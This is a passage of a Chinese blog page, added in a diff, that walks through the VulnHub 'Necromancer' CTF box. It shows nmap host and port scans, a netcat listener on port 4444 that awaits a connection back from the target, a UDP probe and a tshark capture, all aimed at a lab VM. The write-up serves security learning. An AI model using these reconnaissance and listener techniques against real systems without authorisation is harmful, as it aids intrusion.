@@ -1,0 +1,1582 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="一个综合的靶场"><title>Necromancer Vulunhub靶场复现</title><link rel=canonical href=https://ke1thli.github.io/p/necromancer-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href=/scss/style.min.e62e09c60ba428a627e03568fa3df938f6a8224f815b5846f00816c17d4a0be4.css><meta property='og:title' content="Necromancer Vulunhub靶场复现"><meta property='og:description' content="一个综合的靶场"><meta property='og:url' content='https://ke1thli.github.io/p/necromancer-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/'><meta property='og:site_name' content='Ke1thLi 的技术笔记'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Vulnhub'><meta property='article:published_time' content='2026-10-07T00:00:00+00:00'><meta property='article:modified_time' content='2026-10-07T00:00:00+00:00'><meta name=twitter:title content="Necromancer Vulunhub靶场复现"><meta name=twitter:description content="一个综合的靶场"><link rel="shortcut icon" href=/img/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar.png width=640 height=640 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎓</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ke1thLi 的技术笔记</a></h1><h2 class=site-description>The harder you work, the luckier you get</h2></div></header><ol class=menu-social><li><a href=https://github.com/Ke1thLi title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span></span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title"></h2><div class=widget--toc><nav class=toc-nav id=TableOfContents><ol><li><a href=#靶场介绍>靶场介绍</a><ol><li><a href=#靶场部署>靶场部署</a></li></ol></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描和漏洞探测>端口扫描和漏洞探测</a></li></ol></li><li><a href=#发现666端口开放udp协议>发现666端口开放UDP协议</a></li><li><a href=#为什么是链接4444端口呢>为什么是链接4444端口呢？</a></li><li><a href=#收到666链接并获取一段base64编码字符>收到666链接并获取一段base64编码字符</a></li><li><a href=#获取flag1>获取flag1</a></li><li><a href=#获取flag2>获取flag2</a></li><li><a href=#获取flag3>获取flag3</a><ol><li><a href=#web服务探测>Web服务探测</a></li><li><a href=#目录爆破>目录爆破</a></li><li><a href=#将80端口的照片下载下来静态分析>将80端口的照片下载下来静态分析</a></li></ol></li><li><a href=#获取flag4>获取flag4</a><ol><li><a href=#访问新路径>访问新路径</a></li><li><a href=#对新目录进行目录爆破>对新目录进行目录爆破</a></li><li><a href=#得到一个可执行文件>得到一个可执行文件</a></li></ol></li><li><a href=#获取flag5>获取flag5</a></li><li><a href=#获取flag6>获取flag6</a></li><li><a href=#获取flag7>获取flag7</a><ol><li><a href=#抓包分析抓到-wpa-握手>抓包分析：抓到 WPA 握手</a></li><li><a href=#爆破-wpa-口令>爆破 WPA 口令</a></li><li><a href=#用口令作-snmp-community-打-161>用口令作 SNMP community 打 161</a></li><li><a href=#用读写-community-解锁-door>用读写 community 解锁 door</a></li><li><a href=#解锁后再读-system-组>解锁后再读 system 组：</a></li></ol></li><li><a href=#获取flag8>获取flag8</a><ol><li><a href=#ssh登陆>ssh登陆</a></li></ol></li><li><a href=#获取flag9-flag10>获取flag9 flag10</a></li><li><a href=#获取flag11>获取flag11</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/necromancer-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/>Necromancer Vulunhub靶场复现</a></h2><h3 class=article-subtitle>一个综合的靶场</h3></div><footer class=article-meta><div class=inline-meta><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-10-07T00:00:00Z>Wednesday, October 7, 2026</time>
+<svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading></time></div></footer></div></header><aside class=article-toc><details><summary><div class=article-toc-title><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6-6 6"/></svg>
+<span></span></div></summary><nav class=toc-nav><ol><li><a href=#靶场介绍>靶场介绍</a><ol><li><a href=#靶场部署>靶场部署</a></li></ol></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描和漏洞探测>端口扫描和漏洞探测</a></li></ol></li><li><a href=#发现666端口开放udp协议>发现666端口开放UDP协议</a></li><li><a href=#为什么是链接4444端口呢>为什么是链接4444端口呢？</a></li><li><a href=#收到666链接并获取一段base64编码字符>收到666链接并获取一段base64编码字符</a></li><li><a href=#获取flag1>获取flag1</a></li><li><a href=#获取flag2>获取flag2</a></li><li><a href=#获取flag3>获取flag3</a><ol><li><a href=#web服务探测>Web服务探测</a></li><li><a href=#目录爆破>目录爆破</a></li><li><a href=#将80端口的照片下载下来静态分析>将80端口的照片下载下来静态分析</a></li></ol></li><li><a href=#获取flag4>获取flag4</a><ol><li><a href=#访问新路径>访问新路径</a></li><li><a href=#对新目录进行目录爆破>对新目录进行目录爆破</a></li><li><a href=#得到一个可执行文件>得到一个可执行文件</a></li></ol></li><li><a href=#获取flag5>获取flag5</a></li><li><a href=#获取flag6>获取flag6</a></li><li><a href=#获取flag7>获取flag7</a><ol><li><a href=#抓包分析抓到-wpa-握手>抓包分析：抓到 WPA 握手</a></li><li><a href=#爆破-wpa-口令>爆破 WPA 口令</a></li><li><a href=#用口令作-snmp-community-打-161>用口令作 SNMP community 打 161</a></li><li><a href=#用读写-community-解锁-door>用读写 community 解锁 door</a></li><li><a href=#解锁后再读-system-组>解锁后再读 system 组：</a></li></ol></li><li><a href=#获取flag8>获取flag8</a><ol><li><a href=#ssh登陆>ssh登陆</a></li></ol></li><li><a href=#获取flag9-flag10>获取flag9 flag10</a></li><li><a href=#获取flag11>获取flag11</a></li></ol></nav></details></aside><section class=article-content><h1 id=necromancer-vulnhub靶场复现>Necromancer VulnHub靶场复现</h1><h2 id=靶场介绍>靶场介绍</h2><p>靶场地址 <a class=link href=https://www.vulnhub.com/entry/the-necromancer-1,154/ target=_blank rel=noopener>https://www.vulnhub.com/entry/the-necromancer-1,154/</a></p><p>介绍如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-md data-lang=md><span class=line><span class=cl>The Necromancer boot2root box was created for a recent SecTalks Brisbane CTF competition.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>There are 11 flags to collect on your way to solving the challenging, and the difficulty level is considered as beginner.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The end goal is simple... destroy The Necromancer!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=gh># Notes
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>-</span> DHCP (Automatically assigned)
+</span></span><span class=line><span class=cl><span class=k>-</span> IMPORTANT: The vm IS working as intended if you receive a successful DHCP lease as seen in the boot up sequence.
+</span></span><span class=line><span class=cl><span class=k>-</span> The Necromancer VM MUST be on the same subnet as the attacking machine. Ideally both the boot2root VM and the attacking machine should be on the same HostOnly network. If you choose to use a physical box as the attacking machine, the boot2root VM must exist on the same network via a bridged interface.
+</span></span></code></pre></td></tr></table></div></div><h3 id=靶场部署>靶场部署</h3><p>默认是桥接，改为nat</p><h2 id=信息收集>信息收集</h2><h3 id=主机发现>主机发现</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap -sn 10.10.10.0/24
+</span></span></code></pre></td></tr></table></div></div><p>获取靶机的ip为 10.10.10.102</p><h3 id=端口扫描和漏洞探测>端口扫描和漏洞探测</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sS -sV -O -sC -p- --min-rate <span class=m>5000</span> 10.10.10.102 
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-10-06 11:22 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.102
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00059s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>All <span class=m>65535</span> scanned ports on 10.10.10.102 are in ignored states.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65535</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:27:05:E2 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Too many fingerprints match this host to give specific OS details
+</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 34.88 seconds
+</span></span></code></pre></td></tr></table></div></div><p>所有端口被过滤（filtered），但 nmap 能拿到 MAC 地址</p><p>靶机是明确在线的，但 TCP 层面没有回应</p><p>Nmap 能通过二层（ARP）发现目标主机存在，但 TCP 探测包没有得到预期响应，因此端口被标记为 filtered。这可能是防火墙过滤，也可能是其他网络策略导致</p><p>ping一下看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ ping -c <span class=m>3</span> 10.10.10.102
+</span></span><span class=line><span class=cl>PING 10.10.10.102 <span class=o>(</span>10.10.10.102<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>--- 10.10.10.102 ping statistics ---
+</span></span><span class=line><span class=cl><span class=m>3</span> packets transmitted, <span class=m>0</span> received, 100% packet loss, <span class=nb>time</span> 2122ms
+</span></span></code></pre></td></tr></table></div></div><p>100%丢包，可能是靶机的防火墙设定的，不过在这之前，可以先用nmap的udp功能探测一下</p><h2 id=发现666端口开放udp协议>发现666端口开放UDP协议</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sU --top-ports <span class=m>10000</span> 10.10.10.102
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-10-06 11:35 -0400
+</span></span><span class=line><span class=cl>Stats: 0:02:08 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing UDP Scan
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.102
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00070s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>9999</span> open<span class=p>|</span>filtered udp ports <span class=o>(</span>no-response<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT    STATE SERVICE
+</span></span><span class=line><span class=cl>666/udp open  doom
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:27:05:E2 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 188.83 seconds   
+</span></span></code></pre></td></tr></table></div></div><p>UDP 扫描比 TCP 扫描更难判断状态。<code>open|filtered</code> 表示 Nmap 无法区分端口是真的开放还是被过滤，而 666/udp 获得了明确响应，因此最终被判断为 open</p><p>666端口是开放的，符合了Necromancer（死灵法师）这个地狱色彩的主题</p><p>利用这个端口做一个仔细扫描</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap -sU -p <span class=m>666</span> -sV -sC 10.10.10.102
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl>PORT    STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>666/udp open  doom?
+</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   AFSVersionRequest, Citrix, DNS-SD, DNSStatusRequest, DNSVersionBindReq, DTLSSessionReq, Help, Kerberos, NBTStat, NTPRequest, NetMotionMobility, QUIC, RPCCheck, SIPOptions, SNMPv1public, SNMPv3GetRequest, Sqlping, sybaseanywhere, xdmcp: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_    You gasp <span class=k>for</span> air! Time is running out!
+</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class=line><span class=cl>SF-Port666-UDP:V<span class=o>=</span>7.99%I<span class=o>=</span>7%D<span class=o>=</span>10/6%Time<span class=o>=</span>6AC51699%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>RPC
+</span></span><span class=line><span class=cl>SF:Check,27,<span class=s2>&#34;You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n
+</span></span></span><span class=line><span class=cl><span class=s2>SF:&#34;</span><span class=o>)</span>%r<span class=o>(</span>DNSVersionBindReq,27,<span class=s2>&#34;You\x20gasp\x20for\x20air!\x20Time\x20is\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>DNSStatusRequest,27,<span class=s2>&#34;You\x20gasp\x20for\x20air!\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20Time\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>NBTStat,27,<span class=s2>&#34;You\x20gasp\x20for\x2
+</span></span></span><span class=line><span class=cl><span class=s2>SF:0air!\x20Time\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>Help,27,<span class=s2>&#34;You\x20gasp\x20fo
+</span></span></span><span class=line><span class=cl><span class=s2>SF:r\x20air!\x20Time\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>SIPOptions,27,<span class=s2>&#34;You\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>Sqlping,27,<span class=s2>&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>SF:You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>NTPRe
+</span></span><span class=line><span class=cl>SF:quest,27,<span class=s2>&#34;You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n
+</span></span></span><span class=line><span class=cl><span class=s2>SF:&#34;</span><span class=o>)</span>%r<span class=o>(</span>SNMPv1public,27,<span class=s2>&#34;You\x20gasp\x20for\x20air!\x20Time\x20is\x20runni
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ng\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>SNMPv3GetRequest,27,<span class=s2>&#34;You\x20gasp\x20for\x20air!\x20Tim
+</span></span></span><span class=line><span class=cl><span class=s2>SF:e\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>xdmcp,27,<span class=s2>&#34;You\x20gasp\x20for\x20air!\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20Time\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>AFSVersionRequest,27,<span class=s2>&#34;You\x20gasp
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20for\x20air!\x20Time\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>DNS-SD,27,<span class=s2>&#34;You\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>Citrix,27,
+</span></span><span class=line><span class=cl>SF:<span class=s2>&#34;You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>Kerb
+</span></span><span class=line><span class=cl>SF:eros,27,<span class=s2>&#34;You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n&#34;</span>
+</span></span><span class=line><span class=cl>SF:<span class=o>)</span>%r<span class=o>(</span>sybaseanywhere,27,<span class=s2>&#34;You\x20gasp\x20for\x20air!\x20Time\x20is\x20runn
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ing\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>NetMotionMobility,27,<span class=s2>&#34;You\x20gasp\x20for\x20air!\x20T
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ime\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>DTLSSessionReq,27,<span class=s2>&#34;You\x20gasp\x20fo
+</span></span></span><span class=line><span class=cl><span class=s2>SF:r\x20air!\x20Time\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>QUIC,27,<span class=s2>&#34;You\x20gasp\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20for\x20air!\x20Time\x20is\x20running\x20out!\n&#34;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:27:05:E2 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 109.25 seconds
+</span></span></code></pre></td></tr></table></div></div><p>nmap发送了 RPCCheck, DNSVersionBindReq, SNMPv1public, Sqlping 等十几种不同协议的数据包,无论 Nmap 发什么探测包,靶机只回复这一句You gasp for air! Time is running out!</p><p>说明这是一个自定义服务</p><p>目前为止我们只知道UDP 666 开放，且是一个非标准协议的自定义服务</p><p>那么我们想要与这个靶机交互不能直接通过tcp协议而是udp协议，UDP 协议是无连接的、不可靠的。UDP 本身是无连接协议。这里并不能仅凭 UDP 的特性断定服务一定会反向连接 TCP，但结合该靶机的行为，可以通过抓包观察它是否会主动向攻击机发起 TCP 连接。我们可以尝试让这个udp 666 端口主动往我们交互看看有没有结果</p><p>在两个终端上分别进行以下操作</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nc -lvnp <span class=m>4444</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;test&#34;</span> <span class=p>|</span> nc -u 10.10.10.102 <span class=m>666</span>
+</span></span></code></pre></td></tr></table></div></div><p>nc -u：以 UDP 模式运行 Netcat</p><p>一开始可能没有信息回显，稍微等待一会</p><h2 id=为什么是链接4444端口呢>为什么是链接4444端口呢？</h2><p>在这里我们利用tshark看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>tshark -i eth0 -n
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
